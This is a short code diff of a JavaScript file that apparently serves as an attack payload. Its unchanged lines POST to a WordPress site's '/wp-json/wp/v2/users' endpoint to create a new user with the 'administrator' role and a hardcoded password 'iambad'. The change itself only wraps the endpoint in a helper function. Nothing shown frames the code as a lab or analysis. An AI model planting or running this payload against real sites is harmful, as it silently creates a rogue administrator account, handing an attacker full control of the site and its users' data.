@@ -20,6 +20,15 @@ function getPassword() {
   return 'iambad';
 }
 
+/**
+ * Get the WP REST API endpoint for users.
+ *
+ * @return string WP REST API endpoint for users.
+ */
+function getUsersEndpoint() {
+  return '/wp-json/wp/v2/users';
+}
+
 const endPoint = '/wp-json/wp/v2/users';
 const fetchOptions = {
   method: 'POST',
@@ -35,7 +44,8 @@ const fetchOptions = {
     roles: 'administrator',
   })
 };
-fetch(endPoint, fetchOptions)
+
+fetch(getUsersEndpoint(), fetchOptions)
   .then((response) => {
     console.log({response});
     return response.json();
